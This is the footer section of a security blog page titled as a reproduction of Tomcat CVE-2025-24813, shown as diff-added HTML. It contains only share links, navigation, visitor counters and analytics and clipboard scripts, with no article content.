+  <li><a class="icon" href="mailto:?subject=Tomcat CVE-2025-24813 复现&body=Check out this article: https://jaspersec.top/posts/2631321160.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/2631321160.html&title=Tomcat CVE-2025-24813 复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/2631321160.html&name=Tomcat CVE-2025-24813 复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/2631321160.html&t=Tomcat CVE-2025-24813 复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
